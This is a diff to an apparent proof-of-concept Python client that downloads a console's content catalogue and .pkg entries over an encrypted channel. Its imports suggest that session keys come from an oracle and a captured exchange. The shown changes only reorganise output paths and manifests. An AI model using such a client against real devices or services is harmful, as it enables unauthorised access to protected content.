@@ -9,6 +9,7 @@ import struct
 import time
 from pathlib import Path
 
+from poc.dt_layout import payload_directory, metadata_file, entry_manifest
 from poc.dt_ppr_client import derive_with_oracle
 from poc.dt_ppr_power import CAPTURED_BODY
 from poc.dt_psk_client import command_header, derive_keys, recv_exact, recv_record, send_record
@@ -112,6 +113,7 @@ class DtChannel:
 
 
 def download_metadata(channel, output):
+    """Download console catalogue."""
     sub = channel.request(0xA0, struct.pack("<Q", 11))
     deadline = time.monotonic() + 120
     while True:
@@ -128,19 +130,19 @@ def download_metadata(channel, output):
     result, metadata = channel.response(0xB2, sub)
     if result != 0:
         raise ValueError(f"metadata request failed: {result:#x}")
-    output.mkdir(parents=True, exist_ok=True)
-    (output / "metadata.db").write_bytes(metadata)
-    print(f"[metadata] {len(metadata)} bytes -> {output / 'metadata.db'}")
+    destination = metadata_file(output, for_write=True)
+    destination.parent.mkdir(parents=True, exist_ok=True)
+    destination.write_bytes(metadata)
+    print(f"[metadata] {len(metadata)} bytes -> {destination}")
 
 
 def download_entry(channel, entry_id, output, package_only=False):
+    """Download one entry."""
     sub = channel.request(0xB2, struct.pack("<II", 2, entry_id))
     result, _ = channel.response(0xB2, sub)
     if result != 0:
         raise ValueError(f"entry {entry_id} request failed: {result:#x}")
 
-    entry_output = output / str(entry_id)
-    entry_output.mkdir(parents=True, exist_ok=True)
     files = []
     while True:
         header = recv_record(channel.sock, channel.recv_key, channel.recv_nonce, channel.recv_sequence)
@@ -159,6 +161,8 @@ def download_entry(channel, entry_id, output, package_only=False):
         if not name:
             raise ValueError(f"invalid source path: {source_path!r}")
         keep = not package_only or source_path.lower().endswith(".pkg")
+        entry_output = payload_directory(output, entry_id, source_path)
+        entry_output.mkdir(parents=True, exist_ok=True)
         destination = entry_output / name
         partial = destination.with_suffix(destination.suffix + ".part")
         digest = hashlib.sha256()
@@ -187,7 +191,9 @@ def download_entry(channel, entry_id, output, package_only=False):
         })
         print(f"[file] saved {destination} sha256={digest.hexdigest()}")
 
-    (entry_output / "manifest.json").write_text(json.dumps({
+    manifest_path = entry_manifest(output, entry_id, for_write=True)
+    manifest_path.parent.mkdir(parents=True, exist_ok=True)
+    manifest_path.write_text(json.dumps({
         "entry_id": entry_id,
         "files": files,
         str(entry_id): {
@@ -257,7 +263,7 @@ def main():
         download_metadata(data, args.out)
         entry_id = args.entry_id
         if args.browse:
-            entry_id = browse_entries(args.out / "metadata.db")
+            entry_id = browse_entries(metadata_file(args.out))
         if entry_id is not None:
             download_entry(data, entry_id, args.out)
     finally:
